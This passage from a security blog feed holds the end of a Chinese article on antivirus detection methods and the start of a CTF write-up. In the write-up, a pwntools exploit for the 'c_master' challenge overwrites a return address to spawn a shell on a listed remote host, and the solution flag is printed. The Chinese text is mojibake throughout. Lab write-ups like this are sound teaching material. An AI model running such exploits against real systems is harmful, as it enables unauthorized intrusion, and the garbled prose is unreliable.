href="#ç‰¹å¾ç æ£€æµ‹çš„å®ç°è¿‡ç¨‹" class="headerlink" title="ç‰¹å¾ç æ£€æµ‹çš„å®ç°è¿‡ç¨‹"></a>ç‰¹å¾ç æ£€æµ‹çš„å®ç°è¿‡ç¨‹</h3><p><strong>ç—…æ¯’ç‰¹å¾ç </strong>æ˜¯ä»ç—…æ¯’æ ·æœ¬ä¸­æå–çš„ç‹¬ç‰¹äºŒè¿›åˆ¶ä»£ç ç‰‡æ®µï¼Œé€šå¸¸ä¸è¶…è¿‡64å­—èŠ‚ï¼Œå¯è§†ä¸ºç—…æ¯’çš„â€œæ•°å­—æŒ‡çº¹â€ã€‚ç‰¹å¾ç æ£€æµ‹çš„å®ç°éœ€è¦ç»è¿‡ä»¥ä¸‹æŠ€æœ¯æµç¨‹ï¼š</p><ol><li><p><strong>æ ·æœ¬é‡‡é›†ä¸é¢„å¤„ç†</strong><br>é€šè¿‡æ²™ç®±æ•è·ã€ç”¨æˆ·ä¸ŠæŠ¥æˆ–èœœç½ç³»ç»Ÿæ”¶é›†ç—…æ¯’æ ·æœ¬ã€‚ä¾‹å¦‚ï¼Œå®‰å…¨å‚å•†VirusTotalæ¯å¤©æ¥æ”¶è¶…è¿‡100ä¸‡ä»½å¯ç–‘æ–‡ä»¶ï¼Œç»äººå·¥åˆ†æåæå–æœ‰æ•ˆç‰¹å¾ç ã€‚æ ·æœ¬éœ€ç»è¿‡è„±å£³ï¼ˆå¦‚UPXã€ASPackç­‰å¸¸è§å£³ï¼‰ã€è§£å¯†ç­‰é¢„å¤„ç†ï¼Œä»¥è·å–ç—…æ¯’åŸå§‹ä»£ç ã€‚</p></li><li><p><strong>ä»£ç é€†å‘ä¸ç‰¹å¾å®šä½</strong><br>ä½¿ç”¨é€†å‘å·¥å…·ï¼ˆå¦‚IDA Proã€Ghidraï¼‰åˆ†æç—…æ¯’äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå®šä½æ ¸å¿ƒåŠŸèƒ½æ¨¡å—ï¼ˆå¦‚æ„ŸæŸ“æ¨¡å—ã€åŠ å¯†å‡½æ•°ï¼‰ã€‚ä¾‹å¦‚ï¼ŒWannaCryç—…æ¯’çš„MS17-010æ¼æ´åˆ©ç”¨ä»£ç æ®µä¼šè¢«æ ‡è®°ä¸ºå…³é”®ç‰¹å¾ã€‚ä¸ºç¡®ä¿ç‰¹å¾ç ç¨³å®šæ€§ï¼Œé€šå¸¸ä¼šé€‰æ‹©ä»£ç æ®µï¼ˆ.textèŠ‚ï¼‰è€Œéæ•°æ®æ®µï¼ˆ.dataèŠ‚ï¼‰ï¼Œé¿å…ç—…æ¯’å˜ç§ä¿®æ”¹æ•°æ®å¯¼è‡´å¤±æ•ˆã€‚</p></li><li><p><strong>å¤åˆç‰¹å¾ç ç”Ÿæˆ</strong><br>å¯¹å¤šæ€ç—…æ¯’ï¼ˆå¦‚Emotetï¼‰ï¼Œéœ€æå–å¤šæ®µç‰¹å¾ç å½¢æˆé€»è¾‘ç»„åˆã€‚ä¾‹å¦‚ï¼ŒæŸå‹’ç´¢ç—…æ¯’çš„ç‰¹å¾ç å¯èƒ½åŒ…æ‹¬ï¼š</p><ul><li>å­—ç¬¦ä¸²ç‰¹å¾ï¼š<code>&quot;This file is encrypted by [å®¶æ—å]&quot;</code>ï¼›</li><li>ä»£ç ç‰¹å¾ï¼šç‰¹å®šAPIè°ƒç”¨åºåˆ—ï¼ˆå¦‚<code>CryptEncrypt</code>â†’<code>DeleteFile</code>ï¼‰ï¼›</li><li>å“ˆå¸Œç‰¹å¾ï¼šåŠ å¯†å‡½æ•°æ‰€åœ¨ä»£ç èŠ‚çš„SHA-256å€¼ã€‚</li></ul></li><li><p><strong>ç‰¹å¾ç ä¼˜åŒ–ä¸éªŒè¯</strong><br>ä½¿ç”¨å·¥å…·ï¼ˆå¦‚MyCCLï¼‰è¿›è¡Œå†²çªæµ‹è¯•ï¼šå°†ç‰¹å¾ç æ’å…¥æ­£å¸¸æ–‡ä»¶ï¼ŒéªŒè¯æ˜¯å¦è§¦å‘è¯¯æŠ¥ã€‚é€šè¿‡æ¨¡ç³Šå“ˆå¸Œï¼ˆssdeepï¼‰æŠ€æœ¯é™ä½ç‰¹å¾ç å¯¹å¾®å°ä¿®æ”¹çš„æ•æ„Ÿåº¦ï¼Œæå‡å¯¹æŠ—å˜ç§ç—…æ¯’çš„èƒ½åŠ›ã€‚</p></li></ol><hr><h2 id="è¡Œä¸ºç›‘æ§ï¼šå®æ—¶é˜²å¾¡çš„â€œåŠ¨æ€å“¨å…µâ€"><a href="#è¡Œä¸ºç›‘æ§ï¼šå®æ—¶é˜²å¾¡çš„â€œåŠ¨æ€å“¨å…µâ€" class="headerlink" title="è¡Œä¸ºç›‘æ§ï¼šå®æ—¶é˜²å¾¡çš„â€œåŠ¨æ€å“¨å…µâ€"></a>è¡Œä¸ºç›‘æ§ï¼šå®æ—¶é˜²å¾¡çš„â€œåŠ¨æ€å“¨å…µâ€</h2><h3 id="è¡Œä¸ºç›‘æ§çš„æŠ€æœ¯åŸç†"><a href="#è¡Œä¸ºç›‘æ§çš„æŠ€æœ¯åŸç†" class="headerlink" title="è¡Œä¸ºç›‘æ§çš„æŠ€æœ¯åŸç†"></a>è¡Œä¸ºç›‘æ§çš„æŠ€æœ¯åŸç†</h3><p>è¡Œä¸ºç›‘æ§ä¸ä¾èµ–é™æ€ç‰¹å¾ç ï¼Œè€Œæ˜¯é€šè¿‡<strong>é’©å­ï¼ˆHookï¼‰æŠ€æœ¯</strong>å®æ—¶ç›‘æ§ç¨‹åºè¡Œä¸ºï¼Œä¸»è¦å…³æ³¨ä»¥ä¸‹é«˜å±æ“ä½œï¼š</p><ul><li><strong>æ–‡ä»¶æ“ä½œ</strong>ï¼šçŸ­æ—¶é—´å†…åŠ å¯†å¤§é‡æ–‡ä»¶ï¼ˆå¦‚å‹’ç´¢ç—…æ¯’è¡Œä¸ºï¼‰ï¼›</li><li><strong>è¿›ç¨‹æ³¨å…¥</strong>ï¼šå°†ä»£ç å†™å…¥å…¶ä»–è¿›ç¨‹å†…å­˜ï¼ˆå¦‚DLLæ³¨å…¥ï¼‰ï¼›</li><li><strong>æ³¨å†Œè¡¨ç¯¡æ”¹</strong>ï¼šä¿®æ”¹ç³»ç»Ÿå¯åŠ¨é¡¹æˆ–æœåŠ¡é…ç½®ï¼›</li><li><strong>ç½‘ç»œè¡Œä¸º</strong>ï¼šå¼‚å¸¸ç«¯å£æ‰«ææˆ–C2æœåŠ¡å™¨é€šä¿¡ã€‚</li></ul><h3 id="å®ç°æµç¨‹ç¤ºä¾‹ï¼ˆä»¥å‹’ç´¢ç—…æ¯’æ£€æµ‹ä¸ºä¾‹ï¼‰"><a href="#å®ç°æµç¨‹ç¤ºä¾‹ï¼ˆä»¥å‹’ç´¢ç—…æ¯’æ£€æµ‹ä¸ºä¾‹ï¼‰" class="headerlink" title="å®ç°æµç¨‹ç¤ºä¾‹ï¼ˆä»¥å‹’ç´¢ç—…æ¯’æ£€æµ‹ä¸ºä¾‹ï¼‰"></a>å®ç°æµç¨‹ç¤ºä¾‹ï¼ˆä»¥å‹’ç´¢ç—…æ¯’æ£€æµ‹ä¸ºä¾‹ï¼‰</h3><ol><li><p><strong>APIç›‘æ§å±‚</strong><br>é€šè¿‡å†…æ ¸çº§é’©å­ï¼ˆå¦‚Windowsçš„SSDT Hookï¼‰ç›‘æ§<code>CreateFile</code>ã€<code>WriteFile</code>ç­‰æ–‡ä»¶æ“ä½œAPIã€‚å½“æŸè¿›ç¨‹è¿ç»­è°ƒç”¨<code>CreateFile</code>æ‰“å¼€100ä¸ªæ–‡æ¡£æ–‡ä»¶ï¼Œç«‹å³è§¦å‘é¢„è­¦ã€‚</p></li><li><p><strong>è¡Œä¸ºå…³è”åˆ†æ</strong><br>ç»“åˆä¸Šä¸‹æ–‡åˆ¤æ–­æ“ä½œé£é™©ï¼šè‹¥è¯¥è¿›ç¨‹åŒæ—¶è°ƒç”¨<code>CryptGenKey</code>ç”ŸæˆåŠ å¯†å¯†é’¥ï¼Œå¹¶åˆ é™¤å·å½±å‰¯æœ¬ï¼ˆé€šè¿‡<code>vssadmin.exe</code>ï¼‰ï¼Œåˆ™åˆ¤å®šä¸ºå‹’ç´¢ç—…æ¯’ï¼Œè§¦å‘å®æ—¶æ‹¦æˆªã€‚</p></li><li><p><strong>æ²™ç®±éªŒè¯æœºåˆ¶</strong><br>å¯¹å¯ç–‘è¿›ç¨‹è¿›è¡Œéš”ç¦»è¿è¡Œï¼ˆå¦‚Cuckooæ²™ç®±ï¼‰ï¼Œè§‚å¯Ÿå…¶æ˜¯å¦é‡Šæ”¾åŠ å¯†å‹’ç´¢ä¿¡ï¼ˆå¦‚<code>README.txt</code>ï¼‰ï¼Œæœ€ç»ˆç¡®è®¤æ¶æ„è¡Œä¸ºã€‚</p></li></ol><hr><h2 id="å¯å‘å¼åˆ†æï¼šæœªçŸ¥å¨èƒçš„â€œé€»è¾‘æ•æ‰‹â€"><a href="#å¯å‘å¼åˆ†æï¼šæœªçŸ¥å¨èƒçš„â€œé€»è¾‘æ•æ‰‹â€" class="headerlink" title="å¯å‘å¼åˆ†æï¼šæœªçŸ¥å¨èƒçš„â€œé€»è¾‘æ•æ‰‹â€"></a>å¯å‘å¼åˆ†æï¼šæœªçŸ¥å¨èƒçš„â€œé€»è¾‘æ•æ‰‹â€</h2><h3 id="å¯å‘å¼åˆ†æçš„æ ¸å¿ƒæœºåˆ¶"><a href="#å¯å‘å¼åˆ†æçš„æ ¸å¿ƒæœºåˆ¶" class="headerlink" title="å¯å‘å¼åˆ†æçš„æ ¸å¿ƒæœºåˆ¶"></a>å¯å‘å¼åˆ†æçš„æ ¸å¿ƒæœºåˆ¶</h3><p>å¯å‘å¼åˆ†æé€šè¿‡é¢„å®šä¹‰è§„åˆ™é›†å¯¹ç¨‹åºè¿›è¡Œé£é™©è¯„åˆ†ï¼Œä¸»è¦æ£€æµ‹ä»¥ä¸‹å¯ç–‘æ¨¡å¼ï¼š</p><ol><li><p><strong>ä»£ç ç»“æ„å¼‚å¸¸</strong>  </p><ul><li>PEå¤´ä¿¡æ¯ç¯¡æ”¹ï¼ˆå¦‚å…¥å£ç‚¹æŒ‡å‘èµ„æºèŠ‚ï¼‰ï¼›</li><li>èŠ‚åŒºæ®µç†µå€¼è¿‡é«˜ï¼ˆå¯èƒ½ç»è¿‡åŠ å¯†æˆ–å‹ç¼©ï¼‰ï¼›</li><li>å¯¼å…¥è¡¨å¼‚å¸¸ï¼ˆå¦‚ä»…ä¾èµ–<code>LoadLibrary</code>å’Œ<code>GetProcAddress</code>åŠ¨æ€åŠ è½½APIï¼‰ã€‚</li></ul></li><li><p><strong>è¡Œä¸ºæ¨¡å¼è¯„åˆ†</strong><br>æ„å»ºè¯„åˆ†ç³»ç»Ÿï¼ˆæ»¡åˆ†100åˆ†ï¼‰ï¼Œä¾‹å¦‚ï¼š</p><ul><li>åˆ›å»ºè‡ªå¯åŠ¨é¡¹ï¼š+20åˆ†ï¼›</li><li>å°è¯•å…³é—­æ€æ¯’è½¯ä»¶è¿›ç¨‹ï¼š+30åˆ†ï¼›</li><li>æ— æ•°å­—ç­¾åä¸”è¯„åˆ†è¶…è¿‡70åˆ†ï¼šåˆ¤å®šä¸ºæ¶æ„ç¨‹åºã€‚</li></ul></li><li><p><strong>æœºå™¨å­¦ä¹ æ¨¡å‹</strong><br>ä½¿ç”¨éšæœºæ£®æ—æˆ–ç¥ç»ç½‘ç»œæ¨¡å‹ï¼Œè¾“å…¥ç‰¹å¾åŒ…æ‹¬ï¼š</p><ul><li>APIè°ƒç”¨åºåˆ—ï¼ˆå¦‚<code>VirtualAlloc</code>â†’<code>WriteProcessMemory</code>â†’<code>CreateRemoteThread</code>çš„å…¸å‹æ³¨å…¥åºåˆ—ï¼‰ï¼›</li><li>å­—ç¬¦ä¸²ç‰¹å¾ï¼ˆå¦‚ç¡¬ç¼–ç IPåœ°å€æˆ–åŸŸåï¼‰ï¼›</li><li>ä»£ç ç›¸ä¼¼åº¦ï¼ˆä¸å·²çŸ¥ç—…æ¯’å®¶æ—çš„ä»£ç å—åŒ¹é…åº¦ï¼‰ã€‚</li></ul></li></ol><hr><h2 id="ç—…æ¯’åº“çš„é«˜æ•ˆæ„å»ºä¸åŒ¹é…æœºåˆ¶"><a href="#ç—…æ¯’åº“çš„é«˜æ•ˆæ„å»ºä¸åŒ¹é…æœºåˆ¶" class="headerlink" title="ç—…æ¯’åº“çš„é«˜æ•ˆæ„å»ºä¸åŒ¹é…æœºåˆ¶"></a>ç—…æ¯’åº“çš„é«˜æ•ˆæ„å»ºä¸åŒ¹é…æœºåˆ¶</h2><p>ç—…æ¯’åº“çš„å·¥ç¨‹åŒ–è®¾è®¡ç›´æ¥å½±å“æ‰«ææ€§èƒ½ã€‚å…¸å‹æ–¹æ¡ˆåŒ…æ‹¬ï¼š</p><ul><li><strong>åˆ†åº“å­˜å‚¨</strong>ï¼šæŒ‰ç‰¹å¾ç å“ˆå¸Œé¦–å­—æ¯åˆ’åˆ†16ä¸ªå­åº“ï¼Œå‡å°‘éå†æ¬¡æ•°ï¼›</li><li><strong>å¢é‡æ›´æ–°</strong>ï¼šä»…åŒæ­¥æ–°å¢ç‰¹å¾ç ï¼Œé¿å…å…¨é‡ä¸‹è½½å ç”¨èµ„æºï¼›</li><li><strong>å¹¶è¡Œå¤„ç†</strong>ï¼šå¤šçº¿ç¨‹åŒæ—¶æ‰«ææ–‡ä»¶çš„ä¸åŒåŒºæ®µï¼Œå……åˆ†åˆ©ç”¨å¤šæ ¸CPUæ€§èƒ½ã€‚</li></ul><hr><h2 id="æŠ€æœ¯æ¼”è¿›ä¸æœªæ¥é˜²å¾¡è¶‹åŠ¿"><a href="#æŠ€æœ¯æ¼”è¿›ä¸æœªæ¥é˜²å¾¡è¶‹åŠ¿" class="headerlink" title="æŠ€æœ¯æ¼”è¿›ä¸æœªæ¥é˜²å¾¡è¶‹åŠ¿"></a>æŠ€æœ¯æ¼”è¿›ä¸æœªæ¥é˜²å¾¡è¶‹åŠ¿</h2><p>å½“å‰ç—…æ¯’é˜²å¾¡é¢ä¸´ä¸¤å¤§æŒ‘æˆ˜ï¼š</p><ol><li><strong>æœªçŸ¥ç—…æ¯’æ£€æµ‹</strong>ï¼šä¼ ç»Ÿç‰¹å¾ç ä»…èƒ½åº”å¯¹å·²çŸ¥å¨èƒï¼›</li><li><strong>é›¶æ—¥æ”»å‡»é˜²å¾¡</strong>ï¼šAPTæ”»å‡»å¸¸åˆ©ç”¨æœªå…¬å¼€æ¼æ´ï¼Œç»•è¿‡å¸¸è§„æ£€æµ‹ã€‚</li></ol><p>æœªæ¥æŠ€æœ¯å°†å‘ä»¥ä¸‹æ–¹å‘å‘å±•ï¼š</p><ul><li><strong>AIä¸æœºå™¨å­¦ä¹ </strong>ï¼šé€šè¿‡è®­ç»ƒæ¨¡å‹è¯†åˆ«æ¶æ„ä»£ç æ¨¡å¼ï¼Œä¾‹å¦‚åˆ†æAPIè°ƒç”¨åºåˆ—æˆ–å†…å­˜è¡Œä¸ºå¼‚å¸¸ï¼›</li><li><strong>äº‘å®‰å…¨ååŒ</strong>ï¼šå®æ—¶å…±äº«å…¨çƒç—…æ¯’ç‰¹å¾æ•°æ®ï¼Œæ„å»ºåˆ†å¸ƒå¼å¨èƒæƒ…æŠ¥ç½‘ç»œï¼›</li><li><strong>ä¸»åŠ¨é˜²å¾¡ç³»ç»Ÿ</strong>ï¼šåŸºäºç¨‹åºè¡Œä¸ºå®æ—¶æ‹¦æˆªå¯ç–‘æ“ä½œï¼Œè€Œéä¾èµ–äº‹åç‰¹å¾åŒ¹é…ã€‚</li></ul><hr><h2 id="ç”¨æˆ·é˜²æŠ¤å»ºè®®"><a href="#ç”¨æˆ·é˜²æŠ¤å»ºè®®" class="headerlink" title="ç”¨æˆ·é˜²æŠ¤å»ºè®®"></a>ç”¨æˆ·é˜²æŠ¤å»ºè®®</h2><ol><li><strong>é€‰æ‹©æ€æ¯’è½¯ä»¶</strong>ï¼šä¼˜å…ˆè€ƒè™‘ç—…æ¯’åº“æ›´æ–°é¢‘ç‡å¿«ã€èµ„æºå ç”¨ä½çš„å·¥å…·ï¼›</li><li><strong>ç³»ç»Ÿç»´æŠ¤</strong>ï¼šå®šæœŸå®‰è£…å®‰å…¨è¡¥ä¸ï¼Œé¿å…æ¼æ´è¢«åˆ©ç”¨ï¼›</li><li><strong>å®‰å…¨æ„è¯†</strong>ï¼šè°¨æ…æ‰«æä¸æ˜æ¥æºçš„äºŒç»´ç æˆ–é“¾æ¥ï¼Œé˜²æ­¢é’“é±¼æ”»å‡»ã€‚</li></ol><hr><h2 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h2><p>ç—…æ¯’é˜²å¾¡æ˜¯æŠ€æœ¯ä¸æ„è¯†çš„åŒé‡åšå¼ˆã€‚å°½ç®¡ç‰¹å¾ç æŠ€æœ¯ä»æ˜¯å½“å‰ä¸»æµï¼Œä½†å…¶å±€é™æ€§å‚¬ç”Ÿäº†è¡Œä¸ºåˆ†æã€AIé¢„æµ‹ç­‰æ–°ä¸€ä»£è§£å†³æ–¹æ¡ˆã€‚ç”¨æˆ·éœ€åœ¨ä¾èµ–æŠ€æœ¯é˜²æŠ¤çš„åŒæ—¶ï¼Œä¿æŒè­¦æƒ•ï¼Œæ–¹èƒ½æ„ç­‘å…¨é¢çš„æ•°å­—å®‰å…¨é˜²çº¿ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> CyberSecurity </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSCTF_fresh</title>
      <link href="2024/11/10/xsctf_fresh/"/>
      <url>2024/11/10/xsctf_fresh/</url>
      
        <content type="html"><![CDATA[<h2 id="c-master"><a href="#c-master" class="headerlink" title="c_master"></a>c_master</h2><p><code>è¯·ä½¿ç”¨ç®€å•çš„Cè¯­å¥å¯¹ç¨‹åºè¿›è¡Œgetshellå§ï¼</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Try to write a C getshell program with my code!</span><br><span class="line">read(0,base,0x8);</span><br><span class="line">write(1,base,0x8);</span><br><span class="line">base+&#x3D;8;</span><br><span class="line">base-&#x3D;8;</span><br><span class="line">return 0;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">void</span> *s; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> v6[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  s = <span class="built_in">malloc</span>(<span class="number">0x400</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">1024u</span>LL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Try to write a C getshell program with my code!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;read(0,base,0x8);&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;write(1,base,0x8);&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;base+=8;&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;base-=8;&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;return 0;&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>);</span><br><span class="line">            __isoc99_scanf(<span class="string">&quot;%128s&quot;</span>, s);</span><br><span class="line">            <span class="keyword">if</span> ( <span class="built_in">strcmp</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)s, <span class="string">&quot;read(0,base,0x8);&quot;</span>) )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;input:&quot;</span>);</span><br><span class="line">            read(<span class="number">0</span>, &amp;v6[v4], <span class="number">8u</span>LL);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( <span class="built_in">strcmp</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)s, <span class="string">&quot;write(1,base,0x8);&quot;</span>) )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;output:&quot;</span>);</span><br><span class="line">          write(<span class="number">1</span>, &amp;v6[v4], <span class="number">8u</span>LL);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">strcmp</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)s, <span class="string">&quot;base+=8;&quot;</span>) )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        v4 += <span class="number">8</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strcmp</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)s, <span class="string">&quot;base-=8;&quot;</span>) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v4 -= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strcmp</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)s, <span class="string">&quot;return 0;&quot;</span>) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No such code...&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ ¹æ®è¾“å…¥ç¡®å®šå†™å…¥æ•°æ®çš„åœ°å€ï¼Œé‚£ä¹ˆå¯ä»¥ç›´æ¥å°†ä½ç½®å®šä½åˆ°mainå‡½æ•°çš„è¿”å›åœ°å€ï¼Œå†™å…¥ç¨‹åºä¸­æä¾›çš„backdoorå‡½æ•°<br>éœ€è¦æ³¨æ„ç¨‹åºå¼€äº†canaryï¼Œæ‰€ä»¥è¦å¤šå¾€åèµ°ä¸€æ¬¡</p><table><thead><tr><th>Low Address</th><th>â€¦</th><th></th></tr></thead><tbody><tr><td></td><td>local var</td><td>&lt;- rsp</td></tr><tr><td></td><td>canary value</td><td>&lt;- rbp-8</td></tr><tr><td></td><td>old rbp</td><td>&lt;- rbp</td></tr><tr><td></td><td>return address</td><td></td></tr><tr><td></td><td>args</td><td></td></tr><tr><td>High Address</td><td>â€¦</td><td></td></tr></tbody></table><p>å‘ï¼šç›´æ¥è¿”å›åˆ°backdoorå‡½æ•°åˆä¸å¯ä»¥ï¼Œéœ€è¦è¿”å›åˆ°å®é™…æ‰§è¡Œsystemå‡½æ•°çš„ä»£ç åœ°å€</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;43.248.97.213&quot;</span>, <span class="number">30483</span>)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&quot;base+=8;&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&quot;base+=8;&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&quot;base+=8;&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&quot;read(0,base,0x8);&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(p64(<span class="number">0x4012c3</span>))</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&quot;return 0;&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><code>XSCTF&#123;p1e4se_bec0me_4_c_m4ster_x5c7f&#125;</code></p><h2 id="rock-paper-scissors"><a href="#rock-paper-scissors" class="headerlink" title="rock_paper_scissors"></a>rock_paper_scissors</h2><p>æ¬¢è¿æ¥åˆ°çŸ³å¤´å‰ªåˆ€å¸ƒï¼<br>ä¸€å…±è¿›è¡Œä¸‰åå±€ï¼Œä½ èµ¢äº†åŠ ä¸€åˆ†ï¼Œè¾“äº†æˆ–å¹³å±€ä¸å¾—åˆ†<br>è·å¾—ååˆ†å°±ç®—èƒœåˆ©ï¼<br>è¾“å…¥â€™çŸ³å¤´â€™ã€â€™å‰ªåˆ€â€™æˆ–â€™å¸ƒâ€™æ¥è¿›è¡Œæ¸¸æˆ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> 